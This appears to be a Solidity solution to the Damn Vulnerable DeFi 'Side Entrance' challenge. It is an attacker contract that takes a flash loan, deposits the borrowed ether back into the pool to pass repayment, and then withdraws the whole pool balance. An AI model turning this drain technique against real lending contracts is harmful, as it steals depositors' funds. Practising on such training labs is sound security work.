// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
interface ISideEntranceLenderPool {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanEtherReceiver {


    ISideEntranceLenderPool pool;
    address owner;

    constructor(address _pool) {
        owner = msg.sender;
        pool = ISideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        pool.deposit{value: msg.value}();
    }

    function borrow() external {
        require(msg.sender == owner, "only owner");
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    receive () external payable {}
}
